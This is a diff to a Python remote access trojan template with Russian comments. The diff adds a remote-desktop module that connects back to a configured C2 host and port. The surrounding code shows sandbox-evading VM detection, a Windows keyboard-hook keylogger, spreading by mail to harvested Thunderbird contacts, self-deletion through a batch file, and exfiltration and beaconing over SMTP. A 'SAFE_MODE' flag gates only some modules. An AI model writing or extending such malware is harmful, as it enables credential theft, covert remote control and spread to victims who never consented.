@@ -1,7 +1,7 @@
 # language: Python, file: rat_template.py
-# *SAFE_MODE=true — не трогает систему, только пишет %TEMP%\.log_rat.txt*
+# *SAFE_MODE=true — не трогает систему; rdp-модуль включается только при safe_mode=false*
 import os, sys, json, time, base64, threading, subprocess, socket, platform, random, ctypes
-import smtplib, imaplib, email, io, tempfile, shutil, glob
+import smtplib, email, io, tempfile, shutil, glob
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
@@ -45,7 +45,8 @@ def check_vm():
     if platform.system() == "Windows":
         try:
             import winreg
-            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\BIOS")
+            k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
+                              r"HARDWARE\DESCRIPTION\System\BIOS")
             man = winreg.QueryValueEx(k, "SystemManufacturer")[0].lower()
             for m in ("vmware", "virtualbox", "qemu", "innotek"):
                 if m in man:
@@ -87,7 +88,7 @@ def mod_keylogger():
                 f.write(f"{vk:02x} ")
         return user32.CallNextHookEx(None, nCode, wParam, lParam)
     HOOK = WINFUNCTYPE(ctypes.c_long, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
-    hook = user32.SetWindowsHookExA(13, HOOK(cb), kernel32.GetModuleHandleW(None), 0)
+    user32.SetWindowsHookExA(13, HOOK(cb), kernel32.GetModuleHandleW(None), 0)
     msg = wintypes.MSG()
     while user32.GetMessageW(ctypes.byref(msg), None, 0, 0) > 0:
         user32.TranslateMessage(ctypes.byref(msg))
@@ -110,7 +111,8 @@ def mod_spread():
         _log("SAFE: spread skipped")
         return
     contacts = []
-    for f in glob.glob(os.path.expanduser("~/.thunderbird/**/abook*.mab"), recursive=True):
+    for f in glob.glob(os.path.expanduser("~/.thunderbird/**/abook*.mab"),
+                       recursive=True):
         try:
             contacts += [l for l in open(f, encoding="utf-8", errors="ignore")
                          .read().splitlines() if "@" in l]
@@ -128,6 +130,23 @@ def mod_selfdelete():
         with open(bat, "w") as f:
             f.write(f'@echo off\r\ntimeout /t 2 >nul\r\ndel "{target}"\r\ndel "%0"\r\n')
         subprocess.Popen(["cmd", "/c", bat], creationflags=0x08000000)
+
+def mod_rdp():
+    if SAFE:
+        _log("SAFE: rdp skipped")
+        return
+    try:
+        import rdp_agent_lib
+    except ImportError as e:
+        _log(f"rdp: lib not bundled ({e})")
+        return
+    host = CFG.get("c2_host", "127.0.0.1")
+    port = int(CFG.get("c2_port", 5555))
+    _log(f"rdp: connecting {host}:{port}")
+    try:
+        rdp_agent_lib.run(host, port)
+    except Exception as e:
+        _log(f"rdp err: {e}")
 
 def _smtp():
     s = smtplib.SMTP(CFG["smtp_host"], int(CFG["smtp_port"]), timeout=30)
@@ -158,16 +177,18 @@ def main():
             sys.exit(0)
     check_vm()
     if not SAFE:
-        time.sleep(random.randint(30, 120))
+        time.sleep(random.randint(10, 40))
     if "persistence" in MODS: mod_persistence()
     if "keylogger" in MODS:
         threading.Thread(target=mod_keylogger, daemon=True).start()
     if "spread" in MODS: mod_spread()
     if "screenshot" in MODS: mod_screenshot()
-    if "selfdelete" in MODS: mod_selfdelete()
+    if "rdp" in MODS:
+        threading.Thread(target=mod_rdp, daemon=True).start()
     _log(f"started safe={SAFE} mods={sorted(MODS)}")
     send(f"[{HOSTNAME}] {'SAFE heartbeat' if SAFE else 'online'}",
          f"platform={platform.platform()}")
+    if "selfdelete" in MODS: mod_selfdelete()
     while True:
         time.sleep(60)
 
